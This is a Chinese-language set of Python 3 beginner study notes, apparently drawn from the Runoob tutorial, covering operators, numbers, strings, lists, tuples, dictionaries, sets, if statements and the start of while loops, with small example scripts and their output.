### 5-8 Python运算符优先级

![image-20240229112535238](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229112535238.png)

以下实例演示了Python所有运算符优先级的操作：

```python
#!/usr/bin/python3
 
a = 20
b = 10
c = 15
d = 5
e = 0
 
e = (a + b) * c / d       #( 30 * 15 ) / 5
print ("(a + b) * c / d 运算结果为：",  e)
 
e = ((a + b) * c) / d     # (30 * 15 ) / 5
print ("((a + b) * c) / d 运算结果为：",  e)
 
e = (a + b) * (c / d);    # (30) * (15/5)
print ("(a + b) * (c / d) 运算结果为：",  e)
 
e = a + (b * c) / d;      #  20 + (150/5)
print ("a + (b * c) / d 运算结果为：",  e)
```

以上实例输出结果：

```
(a + b) * c / d 运算结果为： 90.0
((a + b) * c) / d 运算结果为： 90.0
(a + b) * (c / d) 运算结果为： 90.0
a + (b * c) / d 运算结果为： 50.0
```

**注意：**Pyhton3 已不支持 <> 运算符，可以使用 != 代替，如果你一定要使用这种比较运算符，可以使用以下的方式：

```python
>>> from __future__ import barry_as_FLUFL
>>> 1 <> 2
True
```

## 6， Python3 数字(Number)

Python 数字数据类型用于存储数值。

数据类型是不允许改变的,这就意味着如果改变数字数据类型的值，将重新分配内存空间。

以下实例在变量赋值时 Number 对象将被创建：

```python
var1 = 1
var2 = 10
```

您也可以使用del语句删除一些数字对象的引用。

del语句的语法是：

```python
del var1[,var2[,var3[....,varN]]]
```

您可以通过使用del语句删除单个或多个对象的引用，例如：

```python
del var
del var_a, var_b
```

Python 支持三种不同的数值类型：

- **整型(Int)** - 通常被称为是整型或整数，是正或负整数，不带小数点。Python3 整型是没有限制大小的，可以当作 Long 类型使用，所以 Python3 没有 Python2 的 Long 类型。
- **浮点型(float)** - 浮点型由整数部分与小数部分组成，浮点型也可以使用科学计数法表示（2.5e2 = 2.5 x 102 = 250）
- **复数( (complex))** - 复数由实数部分和虚数部分构成，可以用a + bj,或者complex(a,b)表示， 复数的实部a和虚部b都是浮点型。

我们可以使用十六进制和八进制来代表整数：

```python
>>> number = 0xA0F # 十六进制
>>> number
2575

>>> number=0o37 # 八进制
>>> number
31
```

![image-20240229113916083](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229113916083.png)

### 6-1 Python 数字类型转换

有时候，我们需要对数据内置的类型进行转换，数据类型的转换，你只需要将数据类型作为函数名即可。

- **int(x)** 将x转换为一个整数。
- **float(x)** 将x转换到一个浮点数。
- **complex(x)** 将x转换到一个复数，实数部分为 x，虚数部分为 0。
- **complex(x, y)** 将 x 和 y 转换到一个复数，实数部分为 x，虚数部分为 y。x 和 y 是数字表达式。

以下实例将浮点数变量 a 转换为整数：

```python
>>> a = 1.0
>>> int(a)
1
```

------

### 6-2 Python 数字运算

Python 解释器可以作为一个简单的计算器，您可以在解释器里输入一个表达式，它将输出表达式的值。

表达式的语法很直白： **+**, **-**, ***** 和 **/**, 和其它语言（如Pascal或C）里一样。例如：

```python
>>> 2 + 2
4
>>> 50 - 5*6
20
>>> (50 - 5*6) / 4
5.0
>>> 8 / 5  # 总是返回一个浮点数
1.6
```

**注意：**在不同的机器上浮点运算的结果可能会不一样。

在整数除法中，除法 **/** 总是返回一个浮点数，如果只想得到整数的结果，丢弃可能的分数部分，可以使用运算符 **//** ：

```python
>>> 17 / 3  # 整数除法返回浮点型
5.666666666666667
>>>
>>> 17 // 3  # 整数除法返回向下取整后的结果
5
>>> 17 % 3  # ％操作符返回除法的余数
2
>>> 5 * 3 + 2 
17
```

**注意：****//** 得到的并不一定是整数类型的数，它与分母分子的数据类型有关系。

```python
>>> 7//2
3
>>> 7.0//2
3.0
>>> 7//2.0
3.0
>>> 
```

等号 **=** 用于给变量赋值。赋值之后，除了下一个提示符，解释器不会显示任何结果。

```python
>>> width = 20
>>> height = 5*9
>>> width * height
900
```

Python 可以使用 ***\*** 操作来进行幂运算：

```python
>>> 5 ** 2  # 5 的平方
25
>>> 2 ** 7  # 2的7次方
128
```

变量在使用前必须先"定义"（即赋予变量一个值），否则会出现错误：

```python
>>> n   # 尝试访问一个未定义的变量
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'n' is not defined
```

不同类型的数混合运算时会将整数转换为浮点数：

```Python
>>> 3 * 3.75 / 1.5
7.5
>>> 7.0 / 2
3.5
```

在交互模式中，最后被输出的表达式结果被赋值给变量 **_** 。例如：

```Python
>>> tax = 12.5 / 100
>>> price = 100.50
>>> price * tax
12.5625
>>> price + _
113.0625
>>> round(_, 2)
113.06
```

此处， **_** 变量应被用户视为只读变量。

### 6-3 数学函数

![image-20240229114102194](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229114102194.png)

### 6-4 随机数函数

随机数可以用于数学，游戏，安全等领域中，还经常被嵌入到算法中，用以提高算法效率，并提高程序的安全性。

Python包含以下常用随机数函数：

![image-20240229114123660](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229114123660.png)

### 6-5 三角函数

Python包括以下三角函数：

![image-20240229114145289](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229114145289.png)

### 6-6 数学常量

![image-20240229114214328](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229114214328.png)

## 7，Python3 字符串

字符串是 Python 中最常用的数据类型。我们可以使用引号( **'** 或 **"** )来创建字符串。

创建字符串很简单，只要为变量分配一个值即可。例如：

```python
var1 = 'Hello World!'
var2 = "Runoob"
```

### 7-1 Python 访问字符串中的值

Python 不支持单字符类型，单字符在 Python 中也是作为一个字符串使用。

Python 访问子字符串，可以使用方括号来截取字符串，如下实例：

```python
#!/usr/bin/python3
 
var1 = 'Hello World!'
var2 = "Runoob"
 
print ("var1[0]: ", var1[0])
print ("var2[1:5]: ", var2[1:5])
```

以上实例执行结果：

```
var1[0]:  H
var2[1:5]:  unoo
```

### 7-2 Python 字符串更新

你可以截取字符串的一部分并与其他字段拼接，如下实例：

```python
#!/usr/bin/python3
 
var1 = 'Hello World!'
 
print ("已更新字符串 : ", var1[:6] + 'Runoob!')
```

以上实例执行结果

```
已更新字符串 :  Hello Runoob!
```

------

### 7-3 Python转义字符

在需要在字符中使用特殊字符时，python用反斜杠(\)转义字符。如下表：

![image-20240229114525742](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229114525742.png)

### 7-4 Python字符串运算符

下表实例变量a值为字符串 "Hello"，b变量值为 "Python"：

![image-20240229114551906](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229114551906.png)

```python
#!/usr/bin/python3
 
a = "Hello"
b = "Python"
 
print("a + b 输出结果：", a + b)
print("a * 2 输出结果：", a * 2)
print("a[1] 输出结果：", a[1])
print("a[1:4] 输出结果：", a[1:4])
 
if( "H" in a) :
    print("H 在变量 a 中")
else :
    print("H 不在变量 a 中")
 
if( "M" not in a) :
    print("M 不在变量 a 中")
else :
    print("M 在变量 a 中")
 
print (r'\n')
print (R'\n')
```

以上实例输出结果为：

```
a + b 输出结果： HelloPython
a * 2 输出结果： HelloHello
a[1] 输出结果： e
a[1:4] 输出结果： ell
H 在变量 a 中
M 不在变量 a 中
\n
\n
```

### 7-5 Python字符串格式化

Python 支持格式化字符串的输出 。尽管这样可能会用到非常复杂的表达式，但最基本的用法是将一个值插入到一个有字符串格式符 %s 的字符串中。

在 Python 中，字符串格式化使用与 C 中 sprintf 函数一样的语法。

```python
#!/usr/bin/python3
 
print ("我叫 %s 今年 %d 岁!" % ('小明', 10))
```

以上实例输出结果：

```
我叫 小明 今年 10 岁!
```

python字符串格式化符号:

![image-20240229114657840](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229114657840.png)

格式化操作符辅助指令:

![image-20240229114716703](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229114716703.png)

### 7-6 Python三引号

python三引号允许一个字符串跨多行，字符串中可以包含换行符、制表符以及其他特殊字符。实例如下

```python
#!/usr/bin/python3
 
para_str = """这是一个多行字符串的实例
多行字符串可以使用制表符
TAB ( \t )。
也可以使用换行符 [ \n ]。
"""
print (para_str)
```

以上实例执行结果为：

```
这是一个多行字符串的实例
多行字符串可以使用制表符
TAB (    )。
也可以使用换行符 [ 
 ]。
```

三引号让程序员从引号和特殊字符串的泥潭里面解脱出来，自始至终保持一小块字符串的格式是所谓的WYSIWYG（所见即所得）格式的。

一个典型的用例是，当你需要一块HTML或者SQL时，这时用字符串组合，特殊字符串转义将会非常的繁琐。

```python
errHTML = '''
<HTML><HEAD><TITLE>
Friends CGI Demo</TITLE></HEAD>
<BODY><H3>ERROR</H3>
<B>%s</B><P>
<FORM><INPUT TYPE=button VALUE=Back
ONCLICK="window.history.back()"></FORM>
</BODY></HTML>
'''
cursor.execute('''
CREATE TABLE users (  
login VARCHAR(8), 
uid INTEGER,
prid INTEGER)
''')
```

### 7-7 f-string

f-string 是 python3.6 之后版本添加的，称之为字面量格式化字符串，是新的格式化字符串的语法。

之前我们习惯用百分号 (%):

```python
>>> name = 'Runoob'
>>> 'Hello %s' % name
'Hello Runoob'
```

f-string 格式话字符串以 f 开头，后面跟着字符串，字符串中的表达式用大括号 {} 包起来，它会将变量或表达式计算后的值替换进去，实例如下：

```python
>>> name = 'Runoob'
>>> f'Hello {name}'  # 替换变量

>>> f'{1+2}'         # 使用表达式
'3'

>>> w = {'name': 'Runoob', 'url': 'www.runoob.com'}
>>> f'{w["name"]}: {w["url"]}'
'Runoob: www.runoob.com'
```

用了这种方式明显更简单了，不用再去判断使用 %s，还是 %d。

在 Python 3.8 的版本中可以使用 **=** 符号来拼接运算表达式与结果：

```python
>>> x = 1
>>> print(f'{x+1}')   # Python 3.6
2

>>> x = 1
>>> print(f'{x+1=}')   # Python 3.8
'x+1=2'
```

### 7-8 Unicode 字符串

在Python2中，普通字符串是以8位ASCII码进行存储的，而Unicode字符串则存储为16位unicode字符串，这样能够表示更多的字符集。使用的语法是在字符串前面加上前缀 **u**。

在Python3中，所有的字符串都是Unicode字符串。

------

### 7-9 Python 的字符串内建函数

Python 的字符串常用内建函数如下

![image-20240229115102772](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229115102772.png)

## 8，Python3 列表

- 序列是Python中最基本的数据结构。序列中的每个元素都分配一个数字 - 它的位置，或索引，第一个索引是0，第二个索引是1，依此类推。
- Python有6个序列的内置类型，但最常见的是列表和元组。
- 序列都可以进行的操作包括索引，切片，加，乘，检查成员。
- 此外，Python已经内置确定序列的长度以及确定最大和最小的元素的方法。
- 列表是最常用的Python数据类型，它可以作为一个方括号内的逗号分隔值出现。
- 列表的数据项不需要具有相同的类型
- 创建一个列表，只要把逗号分隔的不同的数据项使用方括号括起来即可。如下所示：

```python
list1 = ['Google', 'Runoob', 1997, 2000];
list2 = [1, 2, 3, 4, 5 ];
list3 = ["a", "b", "c", "d"];
```

与字符串的索引一样，列表索引从0开始。列表可以进行截取、组合等。

### 8-1 访问列表中的值

使用下标索引来访问列表中的值，同样你也可以使用方括号的形式截取字符，如下所示：

```python
#!/usr/bin/python3
 
list1 = ['Google', 'Runoob', 1997, 2000];
list2 = [1, 2, 3, 4, 5, 6, 7 ];
 
print ("list1[0]: ", list1[0])
print ("list2[1:5]: ", list2[1:5])
```

以上实例输出结果：

```python
list1[0]:  Google
list2[1:5]:  [2, 3, 4, 5]
```

### 8-2 更新列表

你可以对列表的数据项进行修改或更新，你也可以使用append()方法来添加列表项，如下所示：

```python
#!/usr/bin/python3
 
list = ['Google', 'Runoob', 1997, 2000]
 
print ("第三个元素为 : ", list[2])
list[2] = 2001
print ("更新后的第三个元素为 : ", list[2])
```

**注意：**我们会在接下来的章节讨论append()方法的使用

以上实例输出结果：

```
第三个元素为 :  1997
更新后的第三个元素为 :  2001
```

### 8-3 删除列表元素

可以使用 del 语句来删除列表的的元素，如下实例：

```python
#!/usr/bin/python3
 
list = ['Google', 'Runoob', 1997, 2000]
 
print ("原始列表 : ", list)
del list[2]
print ("删除第三个元素 : ", list)
```

以上实例输出结果：

```
原始列表 :  ['Google', 'Runoob', 1997, 2000]
删除第三个元素 :  ['Google', 'Runoob', 2000]
```

**注意：**我们会在接下来的章节讨论 remove() 方法的使用

### 8-4 Python列表脚本操作符

列表对 + 和 * 的操作符与字符串相似。+ 号用于组合列表，* 号用于重复列表。

如下所示：

![image-20240229115414173](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229115414173.png)

### 8-5 Python列表截取与拼接

Python的列表截取与字符串操作类型，如下所示：

```python
L=['Google', 'Runoob', 'Taobao']
```

![image-20240229115454283](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229115454283.png)

```python
>>>L=['Google', 'Runoob', 'Taobao']
>>> L[2]
'Taobao'
>>> L[-2]
'Runoob'
>>> L[1:]
['Runoob', 'Taobao']
>>>
```

列表还支持拼接操作：

```python
>>>squares = [1, 4, 9, 16, 25]
>>> squares += [36, 49, 64, 81, 100]
>>> squares
[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]
>>>
```

### 8-6 嵌套列表

使用嵌套列表即在列表里创建其它列表，例如：

```Python
>>>a = ['a', 'b', 'c']
>>> n = [1, 2, 3]
>>> x = [a, n]
>>> x
[['a', 'b', 'c'], [1, 2, 3]]
>>> x[0]
['a', 'b', 'c']
>>> x[0][1]
'b'
```

### 8-7 Python列表函数&方法

Python包含以下函数:

![image-20240229115614960](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229115614960.png)

Python包含以下方法:

![image-20240229115634113](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229115634113.png)

## 9，Python3 元组

- Python 的元组与列表类似，不同之处在于元组的元素不能修改。
- 元组使用小括号，列表使用方括号。
- 元组创建很简单，只需要在括号中添加元素，并使用逗号隔开即可。

```Python
>>>tup1 = ('Google', 'Runoob', 1997, 2000);
>>> tup2 = (1, 2, 3, 4, 5 );
>>> tup3 = "a", "b", "c", "d";   #  不需要括号也可以
>>> type(tup3)
<class 'tuple'>
```

创建空元组

```
tup1 = ();
```

元组中只包含一个元素时，需要在元素后面添加逗号，否则括号会被当作运算符使用：

```Python
>>>tup1 = (50)
>>> type(tup1)     # 不加逗号，类型为整型
<class 'int'>
 
>>> tup1 = (50,)
>>> type(tup1)     # 加上逗号，类型为元组
<class 'tuple'>
```

元组与字符串类似，下标索引从0开始，可以进行截取，组合等。

### 9-1 访问元组

元组可以使用下标索引来访问元组中的值，如下实例:

```python
#!/usr/bin/python3
 
tup1 = ('Google', 'Runoob', 1997, 2000)
tup2 = (1, 2, 3, 4, 5, 6, 7 )
 
print ("tup1[0]: ", tup1[0])
print ("tup2[1:5]: ", tup2[1:5])
```

以上实例输出结果：

```
tup1[0]:  Google
tup2[1:5]:  (2, 3, 4, 5)
```

### 9-2 修改元组

元组中的元素值是不允许修改的，但我们可以对元组进行连接组合，如下实例:

```Python
#!/usr/bin/python3
 
tup1 = (12, 34.56);
tup2 = ('abc', 'xyz')
 
# 以下修改元组元素操作是非法的。
# tup1[0] = 100
 
# 创建一个新的元组
tup3 = tup1 + tup2;
print (tup3)
```

以上实例输出结果：

```
(12, 34.56, 'abc', 'xyz')
```

### 9-3 删除元组

元组中的元素值是不允许删除的，但我们可以使用del语句来删除整个元组，如下实例:

```python
#!/usr/bin/python3
 
tup = ('Google', 'Runoob', 1997, 2000)
 
print (tup)
del tup;
print ("删除后的元组 tup : ")
print (tup)
```

以上实例元组被删除后，输出变量会有异常信息，输出如下所示：

```
删除后的元组 tup : 
Traceback (most recent call last):
  File "test.py", line 8, in <module>
    print (tup)
NameError: name 'tup' is not defined
```

### 9-4 元组运算符

与字符串一样，元组之间可以使用 + 号和 * 号进行运算。这就意味着他们可以组合和复制，运算后会生成一个新的元组。

![image-20240229115936023](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229115936023.png)

### 9-5 元组索引，截取

因为元组也是一个序列，所以我们可以访问元组中的指定位置的元素，也可以截取索引中的一段元素，如下所示：

元组：

```python
L = ('Google', 'Taobao', 'Runoob')
```

![image-20240229120001754](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229120001754.png)

运行实例如下：

```
>>> L = ('Google', 'Taobao', 'Runoob')
>>> L[2]
'Runoob'
>>> L[-2]
'Taobao'
>>> L[1:]
('Taobao', 'Runoob')
```

### 9-6 元组内置函数

Python元组包含了以下内置函数

![image-20240229120031507](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229120031507.png)

### 9-7 关于元组是不可变的

所谓元组的不可变指的是元组所指向的内存中的内同不可变。

```python
>>> tup = ('r', 'u', 'n', 'o', 'o', 'b')
>>> tup[0] = 'g'     # 不支持修改元素
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: 'tuple' object does not support item assignment
>>> id(tup)     # 查看内存地址
4440687904
>>> tup = (1,2,3)
>>> id(tup)
4441088800    # 内存地址不一样了
```

从以上实例可以看出，重新赋值的元组 tup，绑定到新的对象了，不是修改了原来的对象。

## 10，Python3 字典

字典是另一种可变容器模型，且可存储任意类型对象。

字典的每个键值(key=>value)对用冒号(**:**)分割，每个对之间用逗号(**,**)分割，整个字典包括在花括号(**{})**中 ,格式如下所示：

```Python
d = {key1 : value1, key2 : value2 }
```

键必须是唯一的，但值则不必。

值可以取任何数据类型，但键必须是不可变的，如字符串，数字或元组。

一个简单的字典实例：

```python
dict = {'Alice': '2341', 'Beth': '9102', 'Cecil': '3258'}
```

也可如此创建字典：

```python
dict1 = { 'abc': 456 }
dict2 = { 'abc': 123, 98.6: 37 }
```

### 10-1 访问字典里的值

把相应的键放入到方括号中，如下实例:

```python
#!/usr/bin/python3
 
dict = {'Name': 'Runoob', 'Age': 7, 'Class': 'First'}
 
print ("dict['Name']: ", dict['Name'])
print ("dict['Age']: ", dict['Age'])
```

以上实例输出结果：

```
dict['Name']:  Runoob
dict['Age']:  7
```

如果用字典里没有的键访问数据，会输出错误如下：

```Python
#!/usr/bin/python3
 
dict = {'Name': 'Runoob', 'Age': 7, 'Class': 'First'}
 
print ("dict['Alice']: ", dict['Alice'])
```

以上实例输出结果：

```
Traceback (most recent call last):
  File "test.py", line 5, in <module>
    print ("dict['Alice']: ", dict['Alice'])
KeyError: 'Alice'
```

### 10-2  修改字典

向字典添加新内容的方法是增加新的键/值对，修改或删除已有键/值对如下实例:

```python
#!/usr/bin/python3
 
dict = {'Name': 'Runoob', 'Age': 7, 'Class': 'First'}
 
dict['Age'] = 8               # 更新 Age
dict['School'] = "菜鸟教程"  # 添加信息
 
 
print ("dict['Age']: ", dict['Age'])
print ("dict['School']: ", dict['School'])
```

以上实例输出结果：

```
dict['Age']:  8
dict['School']:  菜鸟教程
```

### 10-3 删除字典元素

能删单一的元素也能清空字典，清空只需一项操作。

显示删除一个字典用del命令，如下实例：

```Python
#!/usr/bin/python3
 
dict = {'Name': 'Runoob', 'Age': 7, 'Class': 'First'}
 
del dict['Name'] # 删除键 'Name'
dict.clear()     # 清空字典
del dict         # 删除字典
 
print ("dict['Age']: ", dict['Age'])
print ("dict['School']: ", dict['School'])
```

但这会引发一个异常，因为用执行 del 操作后字典不再存在：

```
Traceback (most recent call last):
  File "test.py", line 9, in <module>
    print ("dict['Age']: ", dict['Age'])
TypeError: 'type' object is not subscriptable
```

**注：**del() 方法后面也会讨论。

### 10-4 字典键的特性

字典值可以是任何的 python 对象，既可以是标准的对象，也可以是用户定义的，但键不行。

两个重要的点需要记住：

1）不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住，如下实例：

```Python
#!/usr/bin/python3
 
dict = {'Name': 'Runoob', 'Age': 7, 'Name': '小菜鸟'}
 
print ("dict['Name']: ", dict['Name'])
```

以上实例输出结果：

```
dict['Name']:  小菜鸟
```

2）键必须不可变，所以可以用数字，字符串或元组充当，而用列表就不行，如下实例：

```python
#!/usr/bin/python3
 
dict = {['Name']: 'Runoob', 'Age': 7}
 
print ("dict['Name']: ", dict['Name'])
```

以上实例输出结果：

```
Traceback (most recent call last):
  File "test.py", line 3, in <module>
    dict = {['Name']: 'Runoob', 'Age': 7}
TypeError: unhashable type: 'list'
```

### 10-5 字典内置函数&方法

Python字典包含了以下内置函数：

![image-20240229120514575](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229120514575.png)

Python字典包含了以下内置方法：

![image-20240229120535779](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229120535779.png)

## 11，Python3 集合

集合（set）是一个无序的不重复元素序列。

可以使用大括号 **{ }** 或者 **set()** 函数创建集合，注意：创建一个空集合必须用 **set()** 而不是 **{ }**，因为 **{ }** 是用来创建一个空字典。

创建格式：

```
parame = {value01,value02,...}
或者
set(value)
```

```python
>>>basket = {'apple', 'orange', 'apple', 'pear', 'orange', 'banana'}
>>> print(basket)                      # 这里演示的是去重功能
{'orange', 'banana', 'pear', 'apple'}
>>> 'orange' in basket                 # 快速判断元素是否在集合内
True
>>> 'crabgrass' in basket
False
 
>>> # 下面展示两个集合间的运算.
...
>>> a = set('abracadabra')
>>> b = set('alacazam')
>>> a                                  
{'a', 'r', 'b', 'c', 'd'}
>>> a - b                              # 集合a中包含而集合b中不包含的元素
{'r', 'd', 'b'}
>>> a | b                              # 集合a或b中包含的所有元素
{'a', 'c', 'r', 'd', 'b', 'm', 'z', 'l'}
>>> a & b                              # 集合a和b中都包含了的元素
{'a', 'c'}
>>> a ^ b                              # 不同时包含于a和b的元素
{'r', 'd', 'b', 'm', 'z', 'l'}
```

类似列表推导式，同样集合支持集合推导式(Set comprehension):

```python
>>>a = {x for x in 'abracadabra' if x not in 'abc'}
>>> a
{'r', 'd'}
```

### 11-1 集合的基本操作

#### 11-1-1 添加元素

**语法格式如下：**

```python
s.add( x )
```

将元素 x 添加到集合 s 中，如果元素已存在，则不进行任何操作。

```python
>>>thisset = set(("Google", "Runoob", "Taobao"))
>>> thisset.add("Facebook")
>>> print(thisset)
{'Taobao', 'Facebook', 'Google', 'Runoob'}
```

还有一个方法，也可以添加元素，且参数可以是列表，元组，字典等，语法格式如下：

```python
s.update( x )
```

x 可以有多个，用逗号分开。

```python
>>>thisset = set(("Google", "Runoob", "Taobao"))
>>> thisset.update({1,3})
>>> print(thisset)
{1, 3, 'Google', 'Taobao', 'Runoob'}
>>> thisset.update([1,4],[5,6])  
>>> print(thisset)
{1, 3, 4, 5, 6, 'Google', 'Taobao', 'Runoob'}
>>>
```

#### 11-1-2 移除元素

**语法格式如下：**

```
s.remove( x )
```

将元素 x 从集合 s 中移除，如果元素不存在，则会发生错误。

```python
>>>thisset = set(("Google", "Runoob", "Taobao"))
>>> thisset.remove("Taobao")
>>> print(thisset)
{'Google', 'Runoob'}
>>> thisset.remove("Facebook")   # 不存在会发生错误
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
KeyError: 'Facebook'
>>>
```

此外还有一个方法也是移除集合中的元素，且如果元素不存在，不会发生错误。格式如下所示：

```python
s.discard( x )
```

```python
>>>thisset = set(("Google", "Runoob", "Taobao"))
>>> thisset.discard("Facebook")  # 不存在不会发生错误
>>> print(thisset)
{'Taobao', 'Google', 'Runoob'}
```

我们也可以设置随机删除集合中的一个元素，语法格式如下：

```
s.pop() 
```

```python
thisset = set(("Google", "Runoob", "Taobao", "Facebook"))
x = thisset.pop()
 
print(x)
```

输出结果：

```
$ python3 test.py 
Runoob
```

多次执行测试结果都不一样。

set 集合的 pop 方法会对集合进行无序的排列，然后将这个无序排列集合的左面第一个元素进行删除。

#### 11-1-3 计算集合元素个数

**语法格式如下：**

```
len(s)
```

计算集合 s 元素个数。

```python
>>>thisset = set(("Google", "Runoob", "Taobao"))
>>> len(thisset)
3
```

#### 11-1-4 清空集合

**语法格式如下：**

```
s.clear()
```

清空集合 s。

```python
>>>thisset = set(("Google", "Runoob", "Taobao"))
>>> thisset.clear()
>>> print(thisset)
set()
```

#### 11-1-5 判断元素是否在集合中存在

**语法格式如下：**

```
x in s
```

判断元素 x 是否在集合 s 中，存在返回 True，不存在返回 False。

```python
>>>thisset = set(("Google", "Runoob", "Taobao"))
>>> "Runoob" in thisset
True
>>> "Facebook" in thisset
False
>>>
```

### 11-2 集合内置方法完整列表

![image-20240229121127790](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229121127790.png)

## 12，Python3 编程第一步

在前面的教程中我们已经学习了一些 Python3 的基本语法知识，下面我们尝试来写一个斐波纳契数列。

```python
#!/usr/bin/python3
 
# Fibonacci series: 斐波纳契数列
# 两个元素的总和确定了下一个数
a, b = 0, 1
while b < 10:
    print(b)
    a, b = b, a+b
```

其中代码 **a, b = b, a+b** 的计算方式为先计算右边表达式，然后同时赋值给左边，等价于：

```Python
n=b
m=a+b
a=n
b=m
```

执行以上程序，输出结果为：

```python
1
1
2
3
5
8
```

这个例子介绍了几个新特征。

第一行包含了一个复合赋值：变量 a 和 b 同时得到新值 0 和 1。最后一行再次使用了同样的方法，可以看到，右边的表达式会在赋值变动之前执行。右边表达式的执行顺序是从左往右的。

**输出变量值:**

```python
>>> i = 256*256
>>> print('i 的值为：', i)
i 的值为： 65536
```

### end 关键字

关键字end可以用于将结果输出到同一行，或者在输出的末尾添加不同的字符，实例如下：

```python
#!/usr/bin/python3
 
# Fibonacci series: 斐波纳契数列
# 两个元素的总和确定了下一个数
a, b = 0, 1
while b < 1000:
    print(b, end=',')
    a, b = b, a+b
```

执行以上程序，输出结果为：

```python
1,1,2,3,5,8,13,21,34,55,89,144,233,377,610,987,
```

## 13，Python3 条件控制

### 13-1 if 语句

Python中if语句的一般形式如下所示：

```python
if condition_1:
    statement_block_1
elif condition_2:
    statement_block_2
else:
    statement_block_3
```

- 如果 "condition_1" 为 True 将执行 "statement_block_1" 块语句
- 如果 "condition_1" 为False，将判断 "condition_2"
- 如果"condition_2" 为 True 将执行 "statement_block_2" 块语句
- 如果 "condition_2" 为False，将执行"statement_block_3"块语句

Python 中用 **elif** 代替了 **else if**，所以if语句的关键字为：**if – elif – else**。

**注意：**

- 1、每个条件后面要使用冒号 **:**，表示接下来是满足条件后要执行的语句块。
- 2、使用缩进来划分语句块，相同缩进数的语句在一起组成一个语句块。
- 3、在Python中没有switch – case语句。

以下是一个简单的 if 实例：

```python
#!/usr/bin/python3
 
var1 = 100
if var1:
    print ("1 - if 表达式条件为 true")
    print (var1)
 
var2 = 0
if var2:
    print ("2 - if 表达式条件为 true")
    print (var2)
print ("Good bye!")
```

执行以上代码，输出结果为：

```
1 - if 表达式条件为 true
100
Good bye!
```

从结果可以看到由于变量 var2 为 0，所以对应的 if 内的语句没有执行。

以下实例演示了狗的年龄计算判断：

```python
#!/usr/bin/python3
 
age = int(input("请输入你家狗狗的年龄: "))
print("")
if age <= 0:
    print("你是在逗我吧!")
elif age == 1:
    print("相当于 14 岁的人。")
elif age == 2:
    print("相当于 22 岁的人。")
elif age > 2:
    human = 22 + (age -2)*5
    print("对应人类年龄: ", human)
 
### 退出提示
input("点击 enter 键退出")
```

将以上脚本保存在dog.py文件中，并执行该脚本：

```
$ python3 dog.py 
请输入你家狗狗的年龄: 1

相当于 14 岁的人。
点击 enter 键退出
```

以下为if中常用的操作运算符:

![image-20240229121434446](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229121434446.png)

```python
#!/usr/bin/python3
 
# 程序演示了 == 操作符
# 使用数字
print(5 == 6)
# 使用变量
x = 5
y = 8
print(x == y)
```

以上实例输出结果：

```
False
False
```

high_low.py文件演示了数字的比较运算：

```python
#!/usr/bin/python3 
 
# 该实例演示了数字猜谜游戏
number = 7
guess = -1
print("数字猜谜游戏!")
while guess != number:
    guess = int(input("请输入你猜的数字："))
 
    if guess == number:
        print("恭喜，你猜对了！")
    elif guess < number:
        print("猜的数字小了...")
    elif guess > number:
        print("猜的数字大了...")
```

执行以上脚本，实例输出结果如下：

```
$ python3 high_low.py 
数字猜谜游戏!
请输入你猜的数字：1
猜的数字小了...
请输入你猜的数字：9
猜的数字大了...
请输入你猜的数字：7
恭喜，你猜对了！
```

### 13-2 if 嵌套

在嵌套 if 语句中，可以把 if...elif...else 结构放在另外一个 if...elif...else 结构中。

```
if 表达式1:
    语句
    if 表达式2:
        语句
    elif 表达式3:
        语句
    else:
        语句
elif 表达式4:
    语句
else:
    语句
```

```Python
# !/usr/bin/python3
 
num=int(input("输入一个数字："))
if num%2==0:
    if num%3==0:
        print ("你输入的数字可以整除 2 和 3")
    else:
        print ("你输入的数字可以整除 2，但不能整除 3")
else:
    if num%3==0:
        print ("你输入的数字可以整除 3，但不能整除 2")
    else:
        print  ("你输入的数字不能整除 2 和 3")
```

将以上程序保存到 test_if.py 文件中，执行后输出结果为：

```python
$ python3 test.py 
输入一个数字：6
你输入的数字可以整除 2 和 3
```

## 14，Python3 循环语句

### 14-1 while 循环

Python 中 while 语句的一般形式：

```
while 判断条件(condition)：
    执行语句(statements)……
```

同样需要注意冒号和缩进。另外，在 Python 中没有 do..while 循环。

以下实例使用了 while 来计算 1 到 100 的总和：

```python
#!/usr/bin/env python3
 
n = 100
 
sum = 0
counter = 1
while counter <= n:
    sum = sum + counter
    counter += 1
 
print("1 到 %d 之和为: %d" % (n,sum))
```

执行结果如下：

```
